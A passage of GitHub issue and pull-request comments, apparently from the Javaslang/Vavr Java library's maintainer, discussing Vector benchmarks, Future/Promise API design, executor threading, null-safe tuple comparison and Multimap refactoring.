charSeq.toShort(radix)\nSee also Most efficient way of converting String to Integer in java\n. Thx! Just to get sure - did you export it like described in .ide/README.md?\n```\nIntelliJ IDEA\n\nThe following IntelliJ IDEA settings are exported (File/Export Setting):\n\nCode Style\nFile templates\nInspection profiles\n\nSee also issue #133).\n```\nAnother question: Do the 'File and code templates' on your machine contain the Javaslang file header (ascii art)? It once worked for me but after installing another IntelliJ version and importing the Javaslang settings, the custom file templates disappeared.\n. Sounds good - I will merge and import your settings...\n. Hi @paplorinc ,\nthe alignment of chained methods looks ... eh ... really awful. It is too much waste of space and I've seen it never before. We read from left to right. The eye is not used to search in the right half of the screen.\nCould you please send a new formatter that reverts only the chained method option?\nThx!\n\n. Adding this sort of syntactic sugar blows up our API too much We will end up having n versions of several methods.\nSpecial cases are evil. Composition for the win.. Thank you Lorinc!\n. Hi @ronanM,\nthank you for your suggestion.\nWe could rather do it with recoverWith than introducing a new method:\njava\nitemTry.flatMap(item ->\n        doSomethingTry(item.quantity()) // This could fail, but without a useful information.\n        .recoverWith(ex -> Try.failure(new Exception(\"Error while computing item with id: \" + item.id(), ex)))\n);\nAnother equivalent solution is to use map and getOrElseThrow:\njava\nitemTry.mapTry(item ->\n        doSomethingTry(item.quantity()) // This could fail, but without a useful information.\n        .getOrElseThrow(ex -> new Exception(\"Error while computing item with id: \" + item.id(), ex))\n);\nMaybe there are more solutions to the problem than I've shown above. I think we really do not need another method.\nI will close the issue for now and also your PR.\nPlease don't worry when I close an issue. This is a step forward, not backward. We always learn s.th. new, me included!\n. Interesting table of measures :-))\nI've removed functionaljava and PCollections from the following list because they are too slow.\nAlso I've reduced the not-so-common methods.\nGet and Update are most important to us. Vector is a random-access (index sequence) collection and has to be as good as possible in these operations.\nHead, Tail, Prepend and Append are typical linear sequence operations. These are not so interesting because users might choose a linear sequence collection (List or Stream) for that purpose.\nThis is what remains:\n``` java\nOperation  Ratio                                         32     1024    32768\nCreate    slang_persistent/java_mutable               0.87\u00d7    0.44\u00d7      0.58\u00d7\nCreate    slang_persistent/scala_persistent          14.73\u00d7    8.65\u00d7      6.38\u00d7\nGet       slang_persistent/java_mutable               0.86\u00d7    0.34\u00d7      0.30\u00d7\nGet       slang_persistent/scala_persistent           1.26\u00d7    0.86\u00d7      0.81\u00d7\nUpdate    slang_persistent/java_mutable               0.10\u00d7    0.05\u00d7      0.02\u00d7\nUpdate    slang_persistent/scala_persistent           1.17\u00d7    0.98\u00d7      1.17\u00d7\nPrepend   slang_persistent/java_mutable               1.47\u00d7    3.99\u00d7    100.43\u00d7\nPrepend   slang_persistent/scala_persistent           1.33\u00d7    1.41\u00d7      1.44\u00d7\nAppend    slang_persistent/java_mutable               0.26\u00d7    0.14\u00d7      0.10\u00d7\nAppend    slang_persistent/scala_persistent           0.84\u00d7    0.59\u00d7      0.60\u00d7\n```\nUpdate is slow compared to Java mutable. But I think that is not a surprise. Compared to Scala we are head to head here.\nWhy Get and Append are relatively slower than in Scala?\n. Java mutable, are you drunk?\njava\nPrepend   slang_persistent/java_mutable               1.47\u00d7    3.99\u00d7    100.43\u00d7\n. @paplorinc thanks for the great overview. I like it that you not guess but measure!\nCould you create the same overview for the previous/not optimized Vector version? Would be nice for comparison.\n. Update is a little faster than in Scala, I think it is fine.\nI've recognized your speed-fix regarding append(). Do you have an explanation? trailingLength and array.length are the same. How can int length = trailingLength be slower than int length = array.length??\n. Oh Lorinc, please sit down, this one will be hard.\nAfter investigating your code for some hours I came to a decision. I share Ruslan's opinion that the 'leading' & 'trailing' optimization significantly increases the complexity of the implementation.\nI want to pull the first 3 commits (Refactored 'Vector', Optimized 'ofAll', Optimized 'Interator'). I can't pull the other optimizations (append/prepend, drop/take, head, map, filter) of this PR because they depend on the 'leading' & 'trailing' optimization.\nThe fact that implementation details of the BitMappedTrie leak into Vector is also a no-go but the increasing complexity of the implementation is the main pain point.\nYou've put so much time & effort into your optimizations that I really struggled with myself - I thought I have no other choice than pulling all changes into the repository. But to be honest, I have more than a bad feeling regarding the maintenance.\nFor the health of Javaslang I decide for maintainability over performance. But if we take a closer look - do we really decide agaist performance?\nBEFORE:\njava\n    @Override\n    public T get(int index) {\n        if ((index < 0) || (index >= length())) {\n            throw new IndexOutOfBoundsException(\"get(\" + index + \")\");\n        } else {\n            return trie.get(index);\n        }\n    }\nAFTER:\njava\n    @Override\n    public T get(int index) {\n        if ((index < 0) || (index >= length())) {\n            throw new IndexOutOfBoundsException(\"get(\" + index + \")\");\n        } else {\n            if (index < leadingLength()) {\n                return getAt(leading, leadingOffset + index);\n            } else {\n                index -= leadingLength();\n                if (index < middle.length()) {\n                    return middle.get(index);\n                } else {\n                    return getAt(trailing, index - middle.length());\n                }\n            }\n        }\n    }\nUsers expect Vector mainly to be as good as possible in get() and update().\nFrom the Scala documentation:\n\n\"(...) vectors strike a good balance between fast random selections and fast random functional updates (...)\"\n\nIn my opinion we optimize the wrong methods. Vector is an 'IndexedSeq' with accentuation on indexed. append, prepend and head are typical for LinearSeq implementations.\nAgain, from the Scala docs:\n\nLists are very efficient when the algorithm processing them is careful to only process their heads. Accessing, adding, and removing the head of a list takes only constant time (...)\n\nI think the right place for optimized versions of map and filter is BitMappedTrie`. We can't leak implementation details to the outside of BMT.\nI really hope you understand my points. Your work is really awesome.\n. I'm very interested to take all possibilities into account. Do you have time for a hangout during this week?\n. @paplorinc \n\nI pushed a new version with the applied recommendations.\n\nMany thanks for doing it, I really appreciate it! As you said - further optimizations can be applied later.\nLet's finalize this PR. I will still take a look. Maybe we need another iteration...\nThx!\n. (Note: I will focus now on this PR again - starting tomorrow)\n. Hi @paplorinc, now I can't merge because of the conflicts. My fault - I waited too long...\nCould you please merge/resolve the conflicts?\n. Great, thank you!!!\n. I see it different. The tail is not an element, it is a collection of elements. As usual, we align to Scala:\nscala\n/** The empty list.\n *\n *  @author  Martin Odersky\n *  @version 1.0, 15/07/2003\n *  @since   2.8\n */\n@SerialVersionUID(0 - 8256821097970055419L)\ncase object Nil extends List[Nothing] {\n  override def isEmpty = true\n  override def head: Nothing =\n    throw new NoSuchElementException(\"head of empty list\")\n  override def tail: List[Nothing] =\n    throw new UnsupportedOperationException(\"tail of empty list\")\n  // Removal of equals method here might lead to an infinite recursion similar to IntMap.equals.\n  override def equals(that: Any) = that match {\n    case that1: scala.collection.GenSeq[_] => that1.isEmpty\n    case _ => false\n  }\n}\nSource: The Scala 2.12.x source code\nTherefore I will close this issue.\n. This would mix up our collections too much and confuse our users.\nOur design goal is: choose the right collection for the right job. The collections are designed to do one thing best. There already is a Queue and List as Stack (where a linked list is a stack by definition, therefore Stack is not a Traversable).\nWe should close this issue.\nNote: I design Javaslang the following way: Keep things as simple as possible (e.g. like Apple products). Give users only one option, not a hell of options. This will raise unnecessary discussions, questions, etc. There is only one Queue, one Stack, etc. Simplicity is the key to success.\nSecond note: In industry complexity sells. The more feature loaded things are the better. See IBM et al. This is good for managers which do not understand anything about how things really work.\nThe most complicated part in software development is to make things simple. It is easy to add another feature. But it is hard to remove existing code in order to make software better.\nFirst make things, then make them simple. Coding a few code of lines often is a process of coding day and doing multiple iterations deleting code.\nWhen in doubt we follow the rule of thumb there is only one option to accomplish a task.\n. I'm no sure if Vector should implement these interfaces.\nWe then have the following AbstractQueue impls:\n- PriorityQueue\n- Queue\n- Vector\nPriorityQueue is sorted, Queue and Vector not. Queues are used to enqueue/dequeue elements, other use-cases are rare. When to use Queue, when to use Vector?\nThe same with Stack. Common operations are push, pop, peek. When to use Vector over List?\nI think Vector should not implement Queue/Stack - it is more confusing than it helps. Keep it simple!\n. As I said, Vector should not extends AbstractQueue nor implement Stack.\nThat's the reason Stack is not a Traversable. We even thought about removing that interface completely. I think manifesting it tighter within the type hierarchy is the wrong direction for Javaslang.\n\nI think the usecase would be exactly the same as when choosing between ArrayList or ArrayDeque in Java.\n\nArrayList does not implement Queue or Dequeue. Our Vector should not implement Queue operations. If a Queue is needed the user should use the appropriate collection for that purpose.\n. Closed because there are already multiple solutions: https://github.com/javaslang/javaslang/issues/1521#issuecomment-241903306\n. Mmhh - let's first look at the final Benchmarks and compare Array and Vector. From what I can see get() will perform better for Array. If that is the case then Array should stay with us. Array could be helpful for fast reads.\n. Let's keep it because of fast random read access.\n. Let's dig deeper into the topic on how the new Future.of((resolve, reject) -> ...) API should make use of ExecutorServices.\nExample 1: Expensive resolve call, e.g. having a long running operation\n``` java\n// starts a new Thread because longRunningCompuration() must not block the current Thread\nFuture.of(resolve -> resolve.accept(longRunningComputation()));\n// uses someExecutor to start a new Thread\nFuture.of(someExecutor, resolve -> resolve.accept(longRunningComputation()));\n```\nExample 2: Cheap resolve call, e.g. for internal Future.map implementation\n``` java\nFuture first = Future.of(() -> longRunningComputation());\nFunction mapper = ...;\n// creates a new Thread for second Future\nFuture second = Future.of(resolve ->\n        // onComplete reuses Thread of first Future\n        first.onComplete(result -> resolve(result.map(mapper))\n);\n```\nHere are the details what happens:\n- Case 1: The first Future is not completed. Then first.onComplete(action) will add action to the internal list of actions. This happens on the Thread of second Future!\n- Case 2: The first Future is completed. Then first.onComplete(action) will immediately perform the action on the Thread of the first Future (we could change that behavior by passing an ExecutorService to  the first.onComplete() call.). So we are safe, even if the given mapper Function is expensive.\nSummed up, the second Future immediately finishes the computation because first.onComplete() is executed on the Thread of first Future.\nIf we are aware of cheap running operations, we should execute the operation on the current thread:\njava\nFuture<U> second = Future.of(SAME_THREAD_EXECUTOR_SERVICE, resolve ->\n        first.onComplete(result -> resolve(result.map(mapper))\n);\nThis is equivalent  (in fact it will be equivalent when we finished #1530) to:\njava\nFuture<U> second = Future.of(SAME_THREAD_EXECUTOR_SERVICE, resolve ->\n        first.onComplete(SAME_THREAD_EXECUTOR_SERVICE, result -> resolve(result.map(mapper))\n);\nThe SAME_THREAD_EXECUTOR_SERVICE is just a dummy for an ExecutorService that does all operations on the same Thread. Where to put this singleton? These are the options:\n- Future.sameThread(<computation>) factory methods. This does not scale well because non-static operations can not leverage the sameThread() methods.\n- Future.of(Future.SAME_THREAD_EXECUTOR_SERVICE, <computation> singleton. This better but the name is ugly. Can we provide a better API?\nThe DEFAULT_EXECUTOR_SERVICE is also located within the Future interface:\njava\npublic static final ExecutorService DEFAULT_EXECUTOR_SERVICE = Executors.newCachedThreadPool();\nI would not create another class for the Javaslang ExecutorServices.\nConclusion\nIn the case of long running operations, we need to create a new Thread.\nThe golden rule is:\n- new Threads are created on calls of static Future factory methods\n- Threads are reused by default on Future operations (= instance methods) but an optional executor may be provided\n. ### Syntax\nThis is the suggested new API (and also an interesting example for co-variant Consumers!):\n``` java\ninterface Future {\n// using Future DEFAULT_EXECUTOR_SERVICE\nstatic <T> Future<T> of(CheckedConsumer2<Consumer<? extends T>, Consumer<? extends Throwable>> resolveOrReject);\nstatic <T> Future<T> of(CheckedConsumer<Consumer<? extends T>> resolve, CheckedConsumer<Consumer<? extends Throwable>> reject);\nstatic <T> Future<T> of(CheckedConsumer<Consumer<? extends T>> resolve);\n\n// with explicit ExecutorService\nstatic <T> Future<T> of(ExecutorService executorService, CheckedConsumer2<Consumer<? extends T>, Consumer<? extends Throwable>> resolveOrReject);\nstatic <T> Future<T> of(ExecutorService executorService, CheckedConsumer<Consumer<? extends T>> resolve, CheckedConsumer<Consumer<? extends Throwable>> reject);\nstatic <T> Future<T> of(ExecutorService executorService, CheckedConsumer<Consumer<? extends T>> resolve);\n\n}\n```\nNote that we do not have CheckedConsumer0..8 yet - but I think there exists an issue for that. (I will provide the link here.)\nSemantics (informal)\nWithout the loss of generality we define the semantics of the following function:\n``` java\ninterface Future {\nstatic <T> Future<T> of(ExecutorService executorService, CheckedConsumer2<Consumer<? extends T>, Consumer<? extends Throwable>> resolveOrReject) {\n    final FutureImpl<T> future = new FutureImpl<>(executorService);\n    future.run(() -> {\n        final Context<T> context = ... // TBD\n        final Consumer<T> resolve = result -> context.set(result); // TBD\n        final Consumer<Throwable> reject = x -> throw x; // TBD\n        resolveOrReject.apply(resolve, reject));\n        return context.get();\n    }\n    return future;\n}\n\n}\n```\n. ### The nature of a Promise\nOne might think we loose the ability to pass around a writable object that is able to mutate an underlying Future, e.g.\njava\nPromise<T> giveMeAPromiseOfTypeT() {\n    return Promise.make();\n}\nWhat we gain here is just the type T. We have to complete that Promise ourselves with an appropriate value.\n``` java\nfinal Promise promise = giveMeAPromise();\nmightBeInterestedIn(promise.future());\n// zZz\npromise.complete(foo());\n```\nWhat's wrong with this code?\nWe pulled the computational logic out of our asynchronous computation context.\nIf we pass the underlying Future around we do even not know if the Future will be completed at all.\nWe could use a Future instead of a Promise:\njava\nfinal Future<T> future = Future.of(() -> foo());\nmightBeInterestedIn(future);\nYes, that's also working. So when do we need to use Promise at all?\nPromise is a way (/workaround?) to combine Futures.\nGiven a Future (that is not completed yet) we might further process the Future value. The only way to do this is to register a completion handler/action, i.e. with one\n- onComplete(Consumer<Try<T>>)\n- onSuccess(Consumer<T>)\n- onFailure(Consumer<Throwable>).\nBut these methods take Consumer functions, they do not return a value. If we want to transform the value we need to return a new Future because the value might not be present yet. Currently we can't express this with our old-fashioned Future API. Instead we use a Promise:\njava\n<U> Future<U> transform(Future<T> future, Function<T, U> transformation) {\n    final Promise<U> promise = Promise.make();\n    future.onComplete(result -> promise.complete(transformation.apply(result)));\n    return promise.future();\n}\nIt has already been determined which transformation should be applied. Our new Future API leverages this property and brings the computation back into the asynchronous computation context:\njava\n<U> Future<U> transform(Future<T> future, Function<T, U> transformation) {\n    return Future.of(resolve ->\n            resolve.accept(transformation.apply(result))\n    );\n}\nCurrently I find no example where it is necessary to provide the resolve function to the outside.\n. Hi @viktorklang,\nthanks for joining the party and sharing your thoughts! I've followed your links, great stuff (still have to dig deeper regarding space-leaks with ACPS-code - wondering if Java(slang) has the same problem).\n\nI hope the Future of your day is great!\n\nso far so good :)\nYour points and the code examples are very helpful. Coming from\nscala\n// Scala\n((T => Boolean, Throwable => Boolean) => Unit\njava\n// Java\nCheckedConsumer2<Predicate<T>, Predicate<Throwable>>\nyour deduction helped me to understand that, what really happens is, we pass a Promise to our Future constructor. Here are the deduction steps:\nscala\n// Scala\n(Try[T] => Boolean) => Unit\njava\n// Java\nCheckedConsumer<Predicate<Try<T>>>\n\nCommunicates intent, Promise carries more important information, most notably: The \"owner\" of a Promise has promised to complete it. Example: def x(p: Promise[T]) carries more information than: def x(f: Try[T] => Boolean)\n\nThis could be addressed in Java by using @FunctionalInterfaces (Java has no function literals in the same manner Scala has):\njava\n// Java\n@FunctionalInterface\npublic interface Promise<T> {\n    boolean tryComplete(Try<T> result);\n}\nNow the type of the function underlines its purpose.\n\nGives access to check Promise::isCompleted without having to complete it (compared to Try[T] => Boolean\n\nYep, isCompleted() is not any more available on such a function and that hurts. This can be solved by passing a real Promise to the Consumer: \nscala\n// Scala\ndef futureOf[U](f: Promise[U] => Unit)(implicit ec: ExecutionContext): Future[U] =\n  Future.successful(()).flatMap[U](_ => {\n    val p = Promise[U]()\n    f(p)\n    p.future\n  })\njava\n// Java\nstatic <U> Future<U> of(ExecutorService executorService, CheckedConsumer<Promise<U>> f) {\n    return Future.successful(null).flatMap(executorService , ignored -> {\n        final Promise<U> p = Promise.make(executorService);\n        f.accept(p);\n        return p.future();\n    });\n}\nBtw - the trick with the cached instance Future.successful(()) is cool to circumvent an explicit try/catch in order to handle exceptions thrown by f! Need that, too :)\nMy original example can then be expressed like this:\njava\n// Java\nreturn Future.of(promise -> {\n        onComplete(result -> promise.trySuccess(mapper.apply(result)));\n});\n(Please note that the example is not very good because it is the body of the Future.map implementation. The call to onComplete() is a call of the 'outer'  Future method. That's confusing here, I know.)\nI think having such a Future constructor could be helpful. I agree that removing Promise is not a good idea.\nThanks again, Viktor. I really love your APIs/your code. In Future/Promise it all boils down to compositional calls on top of a thin, hardened core.\n. @viktorklang Hope this might be useful in some way. Looking forward to hear from the Klang-Meister :)\n. Idea: If Promise<T> would extend Function<Try<T>>, Boolean>, then it could be better composed (at least in Java, in Scala functions are way better integrated into the language). We could deprecate boolean tryComplete(Try<T>) (but not neccessarily have to) and add Boolean apply(Try<T>).\njava\nclass Promise<T> implements Function1<Try<T>, Boolean> {\n    @Override\n    public Boolean apply(Try<T> result) {\n        return tryComplete(result);\n    }\n    ...\n}\nNote: When introducing a rich Predicate1 in Javaslang the above might be replaced with class Promise<T> implements Predicate1<Try<T>>. But maybe this is unnecessary because Project Valhalla will allow us to have primitive generic type parameters!?\nOur example then looks like this:\njava\n<U> Future<U> map(Function<? super T, ? extends U> mapper) {\n    return Future.of(p -> onComplete(p.compose(mapper)));\n}\nIn Scala Future(onComplete(_ compose mapper)) ?\n(Hope this is right - writing this from the top of my head while cooking... Needs to be tested...)\n@viktorklang Having Promise.apply() would fit good in Scala 2.12 because trySuccess() and tryFailure() are deprecated. Now Promise has only a single complete function. Other Scala types are also Functions, like Map, Set, Seq, ...\n. As Viktor mention on his blog, Promise might not be used as promised by the user, e.g.\njava\nPromise<?> promise = Promise.make();\npromise.completeWith(promise.future); // \ud83d\ude31\nWe removed it in #2093 and introduced the equivalent Future.join():\njava\nstatic <T> Future<T> join(CheckedConsumer<Predicate<Try<? extends T>>> computation) { ... }\nAs the name suggests, join is used to join other future computations (that where forked before). The computation does not eat any extra threads, it is executed synchronously. Typically the tryComplete handler is used in onComplete handlers of other futures.\nExample:\n```java\n// new API\nFuture greeting(Future nameFuture) {\n    return Future.join(tryComplete -> {\n        nameFuture.onComplete(name -> tryComplete.test(Try.success(\"Hi \" + name)));\n    });\n}\n// old API\nFuture greeting(Future nameFuture) {\n    final Promise promise = Promise.make();\n    nameFuture.onComplete(name -> promise.tryComplete(Try.success(\"Hi \" + name)));\n    return promise.future();\n}\n```\n. The Future core (FutureImpl) is small and well organized. By changing a single line we managed to execute all actions on the same Future Thread:\ndiff\n     private void perform(Consumer<? super Try<T>> action) {\n-        Try.run(() -> executorService.execute(() -> action.accept(value.get())));\n+        Try.run(() -> value.forEach(action));\n     }\nBut this is only for testing purposes and not the solution for the problem. We still need to execute the actions by an ExecutorService. It has to be a new single thread ExecutorService (singleton) by default with the option to exchange that:\n``` java\nfinal Future future = Future.of(someExecutor, () -> computation());\n// these use the same thread of future to process result\nfuture.onComplete(Handler::processResult);\nfuture.map(mapper);\n...\n// these use a new thread provided by fooExecutor to process result\nfuture.onComplete(fooExecutor, Handler::processResult);\nfuture.map(fooExecutor, mapper);\n...\n``\n. TODO: Re-enable@Ignored unit tests inFutureTest.java`\n. This issue should solve the following problem (tests by @mattjtodd):\n``` java\n        BlockingQueue queue = new SynchronousQueue<>();\n        ExecutorService service = new ThreadPoolExecutor(1, 1 , 0L, TimeUnit.MILLISECONDS, queue);\n    Future\n        .of(service, () -> { Thread.sleep(100); return true; })\n        .onComplete(System.out::println);\n\n    Thread.sleep(2000);\n    service.shutdown();\n\n```\nWhich results in the onComplete callback never being invoked and no output produced, the callback is never invoked and the DeferredResult is never completed and the request will hang until timeout. In reality with a larger pool and other work eventually competing this should not happen. Java 8's CompletableFuture has variants for expression binding which allow the definition of an Executor. We can show the same effect as above like this:\njava\n        CompletableFuture\n            .supplyAsync(() -> Try\n                .run(() -> TimeUnit.MILLISECONDS.sleep(100))\n                .map(result -> true)\n                .getOrElseThrow(() -> new IllegalStateException()), service)\n            .whenCompleteAsync((result, thrown) -> {\n                System.out.println(result + \" : \" + thrown);\n            }, service);\nIt would be good to have the expression run on the task thread by default and have variants to supply an Executor. Maybe in a similar vein to RxJava an Future.on(Executor executor) method which would define the Executor for all subsequent expressions.\nIn Javaslang this would look like this:\njava\nFuture.of(fooExecutor, this::computation) // executes the async computation using fooExecutor\n    .on(barExecutor) // this line is optional, it will execute all supsequent operations using barExecutor\n    .map(...) // this will execute the map operation on the same task the future currently runs on\n    .map(bazExecutor, ...) // this will execute (only) this map operation on a task created by bazExecutor\n    ...\nI created a new issue for the future.on(ExecutorService) method: #1537 \n. fromJavaFuture and fromJavaCompletableFuture should reuse the existing Thread if possible. The issues mentioned here are solved with #2093 / #2110 / #2111.. Our Future implementation will be dropped. There will be no Vavr 1.0 module vavr-concurrent.\nReason: Implementing our own concurrency library is too error-prone, concurrency is a hard problem. There are many(!) alternatives, first of all Java's native CompletableFuture. Same with Map and Multimap. We need unit-tests that sync/test the API. See #1542 \n. I think it should be automated somehow, like in #1542 . Future is abandoned in Vavr 1.0. Not intended to be pulled yet. Locally the tests still fail, most probably because of the changes to exception handling. But these were made already in 2.0.3!? Why did the tests not fail in the CI tests of 2.0.3? Will update the tests accordingly and investigate further.\n. > Why did the tests not fail in the CI tests of 2.0.3?\nBecause I changed internals of FutureImpl that depended on the dummy impls of java.util.concurrent.Future for our unit tests.\nIn particular the underlying java.util.concurrent.Future contains now a null value when completed.  Before the value of the computation was stored but never used because we store the value of the computation on our own variable which is guarded by a lock. This is important because we need to synchronize the state of our Future ourselves.\nThis change is backward compatible because the java.util.concurrent.Future was not accessible from the outside. It is still used to control the asynchronous computation in the same way as before.\n. Additional backward-compatibility checks may involve checks similar to those of the maven-bundle-plugin (apache-felix project):\nmvn package org.apache.felix:maven-bundle-plugin:baseline -DcomparisonVersion=2.0.0 -DskipTests\n. Moving to 2.2.0. For 2.1.0 I will do this by hand.\n. Out of scope for Javaslang. There exist tools.\n. Baking this feature into Future does not scale well. We are already able to do it using the new Future.join() operation introduces in #2093.\nExample revisited:\n```java\n// instead of...\nFuture.of(fooExecutor, this::computation)\n    .on(barExecutor)\n    .map(...)\n    .map(bazExecutor, ...)\n    ...\n// ...we write\nFuture.join(bazExecutor, tryCompleteBaz ->\n    Future.join(barExecutor, tryCompleteBar ->\n        Future.of(fooExecutor, some::computation).onComplete(tryCompleteBar::test)\n    ).map(...).onComplete(tryCompleteBaz::test)\n).map(...)\n...\n// ...or\nFuture.of(fooExecutor, some::computation)\n    .flatMap(bar -> Future.successful(barExecutor, bar).map(...))\n    .flatMap(baz -> Future.successful(bazExecutor, baz).map(...))\n```\nNote: The Future.successful() calls immediately complete the future without creating a new thread.\nIt is nice to see that the existing API composes well. It is much nicer than introducing an additional state variable to Future (which eats extra mem and extra implementation logic) and introducing copies of all transformational methods that take an ExecutorService. That would blow up the API roughly by factor 2.. We will unlikely add these tests. The inline code-generator will fix this issue (see #1716).. This makes sense. Let's swap the generic params of the return type to be consistent to Queue.dequeue():\njava\nclass Queue<T> {\n    Tuple2<T, Queue<T>> dequeue();\n}\n. This is fixed.\nIf there is still sth missing regarding Multimap we will implement it with #1551 . @ashrko619 would love to see your PR!\n. Right! Four eyes are better than two :)\n. Hi @pivovarit,\nunzipSelf would suggest that there is something like unzip(another). It is always self that is unzipped. unzipWithIdentity would be a better name but no benefit over unzip(identity()).\nThe shorter version unzip() is similar to sorted(). Calling it on an instance should make it clear that the unzip function is applied to that instance. Because Map consists of pairs it is natural that unzip splits these pairs. It is dual to zip, which creates pairs.\nOfftopic: Scala itself is not consistent regarding naming of methods. E.g. we have sorted() and updated() which state that we do not mutate the instance but return a new one. But Map has put and Seq has reverse().\nMaybe we will do it consistent in a future version of Javaslang and deprecate the inconsistent API...\n. @tbroyer thx!\n@paplorinc let's give it a try then!\n. @ruslansennov I prepare 2.1.0. What is your suggestion regarding the target version for the GWT module? I think it can be included in 2.1.0 but we should communicate the GWT support as experimental to get first feedback. What do you think? Or are there still errors that prevent a valid GWT use-case?\n. Good morning,\nthank you Ruslan. Yes, 'provided'  dependencies will not be transitive. Would be interesting if a 'provided' dependency would work though...\nHowever, I will move it to 3.0.0 then.\n. Great, thank you!! I followed your instructions/the javaslang-gwt/README.md and all tests succeeded. Will pull it in now.\n. Hi, thanks for the hint! The apidoc is ok, it was a bug. The current SNAPSHOT is already fixed. I will close this ticket.\n(Behavior relates to #1180 and #1197)\n. Original issue: #1272 (and fix)\n. Hi @ahammel, thank you for reporting! I can reproduce it on 2.0.3 and confirm that it is fixed on the current SNAPSHOT. I will release Bugfix Release 2.0.4 neartime.\n. @ruslansennov do you know/remember with which PR we fixed it?\n. I think it is not fixed. Maybe the example now works on the current SNAPSHOT because the order of Map elements changed!? (A Map is unordered.)\nThe root error is thrown by the Tuple2.compareTo method, which calls this code:\n``` java\n    @SuppressWarnings(\"unchecked\")\n    private static , U2 extends Comparable<? super U2>> int compareTo(Tuple2<?, ?> o1, Tuple2<?, ?> o2) {\n        final Tuple2 t1 = (Tuple2) o1;\n        final Tuple2 t2 = (Tuple2) o2;\n    final int check1 = t1._1.compareTo(t2._1);\n    if (check1 != 0) {\n        return check1;\n    }\n\n    final int check2 = t1._2.compareTo(t2._2);\n    if (check2 != 0) {\n        return check2;\n    }\n\n    // all components are equal\n    return 0;\n}\n\n```\nEspecially these throw:\n- final int check1 = t1._1.compareTo(t2._1); if t1._1 is null\n- final int check2 = t1._2.compareTo(t2._2); if t1._2 is null\nSolution:\nThe generated Tuple code needs to take null values into account when comparing, similar to Comparator.nullsFirst(Comparator) resp. Comparators.NullComparator.\n``` java\nprivate static , U2 extends Comparable<? super U2>, U3 extends Comparable<? super U3>, U4 extends Comparable<? super U4>> int compareTo(Tuple4<?, ?, ?, ?> o1, Tuple4<?, ?, ?, ?> o2) {\n    final Tuple2 t1 = (Tuple2) o1;\n    final Tuple2 t2 = (Tuple2) o2;\n    if (t1 == null) {\n        return (t2 == null) ? 0 : -1;\n    } else if (t2 == null) {\n        return 1;\n    } else {\n        int check;\n        if ((check = compare(t1._1, t2._1) == 0) {\n          if ((check = compare(t1._2, t2._2) == 0) {\n            if ((check = compare(t1._3, t2._3) == 0) {\n              check = compare(t1._4, t2._4);\n            }\n          }\n        }\n        return check;\n    }\n}\nprivate static > compare(U u1, U u2) {\n    if (u1 == null) {\n        return (u2 == null) ? 0 : -1;\n    } if (u2 == null) {\n        return 1;\n    } else {\n        return u1.compareTo(u2);\n    }\n}\n```\nNote: The Tuple*.comparator(Comparator, Comparator, ...) methods need also take null into account.\n. Great, many thanks!\n. Multimap will probably not part of Vavr 1. We want to focus on the most frequently used collections. Maybe we will release some kind of add-on collections package later.. This PR will be closed, I created a new PR with squashed commits: #1553\n. zzZZzz\n. My approach looks too complicated/unintuitive to me.\nExample:\njava\npublic final class LinkedHashMap<K, V> implements Multimap<K, V> {\n    @Override\n    public LinkedHashMultimap<K, V> put(K key, V value) {\n        return Multimaps.put(this, delegate, emptyContainer, containerType, builder()::ofMap, key, value);\n    }\n}\njava\nfinal class Multimaps {\n    static <K, V, M extends Multimap<K, V>> M put(\n            M multimap,\n            Map<K, Traversable<V>> delegate,\n            Traversable<V> emptyContainer,\n            ContainerType containerType,\n            OfMap<K, V, M> ofMap,\n            K key,\n            V value) {\n        final Traversable<V> values = delegate.get(key).getOrElse(emptyContainer);\n        final Traversable<V> newValues = containerType.add(values, value);\n        return (newValues == values) ? multimap : ofMap.apply(delegate.put(key, newValues));\n    }\n}\nE.g. we create a new LinkedHashMultimap.Builder instance to get an instance of the OfMap function, which wraps a delegate. We need an instance to get the instances emptyContainer and containerType. As an alternative we could duplicate the ofMap method - one for the Builder, one for the Multimap implementation.\nYou see, this starts to get cumbersome. Putting a value into a Map should be simple. I have the wrong abstraction here.\nI like @ruslansennov approach to have an AbstractMultimap (btw - same applies for AbstractMap which I already removed and pushed the new Maps helper). But I don't want to make our abstract base impls public. They are not intended to be part of the user API. They just help us internally to factor out duplicate code.\nMaybe there is another way to circumvent the JDK bug by just overriding all methods of the package private base class and delegating to them. I will test it.\njava\npublic final class LinkedHashMap<K, V> extends AbstractMultimap<K, V, LinkedHashMap<K, V>> {\n    @Override\n    public LinkedHashMultimap<K, V> put(K key, V value) {\n        return super.put(key, value);\n    }\n}\nThis solution is fragile in the sense that we could forget to override a method. We would need a unit test that checks overridden methods via reflection for example.\n\nI'm undecided, but I think that I will finish my current refactoring. There are benefits, like fewer type casts...\nUpdate: Actually the second ofMap method is not a duplicate. It does the same but in a different context - we will see it when I get to TreeMultimap. When an operation changes the value-type we need to adjust the Comparator... For the Builder::ofMap this is not the case, the Builder will already know the Comparator.\n. What if... we just duplicate code. It would simplify things.\njava\n@Override\npublic LinkedHashMultimap<K, V> takeUntil(Predicate<? super Tuple2<K, V>> predicate) {\n    Objects.requireNonNull(predicate, \"predicate is null\");\n    return takeWhile(predicate.negate());\n}\nThis is a typical code-generator case. We could generate all Multimaps and Maps. Then we have the possibility to apply better optimizations and there are fewer classes. On the other hand that would make it harder to get the hands on these classes for further changes.\n\nWill sleep one night over this topic...\n...but I already like the idea - we will get rid of unnecessary code and make decisions already at code generation time.\n- fewer classes\n- code of different impls automatically in sync because based on same generator templates\n- centralized code changes, apply to all impls automatically\n- no technical overhead in production code, like Map Suppliers in order to abstract over impl type\n- ...\n. This will still take some time. Maybe we should move this issue to the next (bugfix or minor) release in order to ship 2.0.4. In other words method references will not work for Maps/Multimaps. Workaround: use lambdas instead of method references. Good thing: It is a JDK bug, not a Javaslang bug, but should be fixed neartime.\nI think we still have problems in TreeMap and/or TreeMultimap when the value type is changed by an operation (based on wrong Comparators). But I haven't investigated it yet.\nAlso operations of sorted collections that operate on multiple instances with different underlying Comparators make cause unexpected behavior. But this has to be checked and solved step-by-step. I'm alread on it by re-designing the RedBlackTree with some optimizations and preparation for the Navigable additions...\nSo much to do :) Known bugs are ok. The most important thing is to ship reliable, backward-compatible software.\n. We already removed AbstractMap. I wouldn't revert that change - but stop this change here.\nI will move (the rest of) #1326 to 2.0.5 and go the generator-way.\n. > can't we make the abstractions public instead\nNo. They are only ballast and would pollute the user's view on the Javaslang API.\n\nIf I'm mistaken correctly the problem is that the returned value is a package-private superclass.\n\nThat's not the problem. The returned value is a generic M extends Multimap<K, V>. The M is public (e.g. LinkedHashMultimap).\n\nBut can't we extract a public interface for the private superclass and return the interface instead?\n\nWe 